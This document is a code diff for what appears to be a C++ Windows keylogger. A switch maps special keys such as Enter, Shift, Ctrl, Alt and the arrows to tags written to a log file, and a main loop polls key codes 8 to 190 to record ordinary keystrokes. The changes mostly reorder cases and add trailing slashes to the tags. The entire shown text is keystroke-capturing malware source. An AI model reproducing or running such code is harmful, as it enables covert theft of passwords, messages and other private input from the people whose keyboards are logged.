@@ -14,57 +14,59 @@ void save(string key) {
 		log.close();
 	} 
 }
-/*Cases for key other than alphabet. In case of special letters,*/
-
+/*Cases for key other than alphabet i,e special letters*/
 bool key(int press) {
 	switch (press) {
-	case VK_SPACE:
-		save("/spacebar");
-		return true;
+	default: 
+		return false;
+
 	case VK_RETURN:
-		save("/enter");
+		save("/enter/");
 		return true;
 	case VK_SHIFT:
-		save("/shift");
+		save("/shift/");
 		return true;
 	case VK_BACK:
-		save("/backspace");
+		save("/backspace/");
 		return true;
+    case VK_SPACE:
+		save("/spacebar/");
+		return true;   
 	case VK_RBUTTON:
 		save("");
     case VK_LBUTTON:
 		save("");
 		return true;
 	case VK_CAPITAL:
-		save("/caps");
+		save("/caps/");
 		return true;
 	case VK_TAB:
-		save("/tab");
+		save("/tab/");
 		return true;
 	case VK_UP:
-		save("/arrowup");
+		save("/arrowup/");
 		return true;
 	case VK_DOWN:
-	    save("/down");
+	    save("/down/");
 		return true;
 	case VK_LEFT:
-		save("/leftarrow");
+		save("/leftarrow/");
 		return true;
 	case VK_RIGHT:
-		save("/rightarrow");
+		save("/rightarrow/");
 		return true;
 	case VK_CONTROL:
-		save("/controlkey");
+		save("/controlkey/");
 		return true;
 	case VK_MENU:
-		save("/altkey");
+		save("/altkey/");
 		return true;
-	default: 
-		return false;
+	
 	}
 }
+/*Method that saves normal key input*/
 void normalKey(){
-char i;
+    char i;
     fstream record;
     while (true) {
         for (i = 8; i < 190; i++) {
@@ -79,6 +81,7 @@ char i;
         }
     }
 }
+
 int main () {
     normalKey();
     return 0;
